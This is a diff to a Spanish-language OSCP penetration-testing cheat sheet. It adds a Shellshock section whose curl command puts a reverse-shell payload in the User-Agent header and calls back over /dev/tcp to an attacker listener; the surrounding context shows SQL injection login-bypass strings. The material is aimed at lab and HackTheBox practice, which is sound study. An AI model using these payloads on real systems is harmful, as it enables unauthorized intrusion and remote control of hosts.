@@ -31,7 +31,8 @@
        * [WordPress](#wordpress)
        * [Joomla](#joomla)
        * [Drupal](#drupal)
-       * [PFSense](#PFSense)
+       * [PFSense](#pfsense)
+       * [File Upload Bypass](#file-upload-bypass)
        * [Fuerza Bruta en Formularios](#fuerza-bruta-en-formularios)
        * [Enumeración de Usuarios en Paneles de Autenticación](#login-user-enumeration)
        * [PHP Reverse Shell](#php-reverse-shell)
@@ -1006,6 +1007,24 @@ Password: admin' or 1=1-- -
 Para casos donde podamos llevar a cabo un nuevo registro de usuario, otra vía es crear un usuario con nombre **admin' or 1=1-- -** y password **admin' or 1=1-- -**, de esta forma tras posteriormente realizar la autenticación como usuario válido, tendremos acceso a todos los datos de los usuarios en la base de datos principal.
 
 Para técnicas de bypassing consultar el siguiente [enlace](https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF)
+
+#### Shellshock
+
+Buenas máquinas para practicar este tipo de ataques fuera del laboratorio del OSCP son la máquina **Shocker** y la máquina **Beep** de HackTheBox.
+
+Esta es una vulnerabilidad que sólo se ve en Linux, pues en Windows no afecta. La vulnerabilidad lo que nos permite es, tras no validar de forma correcta la declaración de funciones en variables, ejecutar comandos en remoto sobre sistemas a través de consultas en este caso por medio de peticiones web.
+
+Un buen **Low Hanging Fruit** puede consistir en enumerar el directorio **/cgi-bin/** de una página web. De existir, podemos buscar por archivos de extensión '**.cgi**', aunque no es extrictamente necesario... pues también podría tratarse de un archivo de extensión '**.sh**' y los efectos serían los mismos.
+
+En caso de encontrar estos recursos, podemos realizar pruebas como las que se describen a continuación. En primer lugar nos ponemos en escucha por un puerto en nuestro equipo vía Netcat. En segundo lugar realizamos la siguiente petición desde terminal al servicio web:
+
+```bash
+$~ curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ipLocal/puertoLocal 0>&1" "https://192.168.1.X:10000/cgi-bin/recurso.cgi" 
+```
+
+Si todo sale bien y es vulnerable a la explotación de dicha vulnerabilidad, deberemos ganar acceso al sistema desde nuestra sesión de escucha.
+
+**Advertencia**: En caso de que **/bin/bash** no funcione, se recomienda probar alternativas, pues hay ocasiones en las que la ruta absoluta del binario no es la que hemos especificado, por lo que se requerirá de una ligera enumeración manual o un simple modo alternativo de conexión
 
 ### Pentesting Linux
 
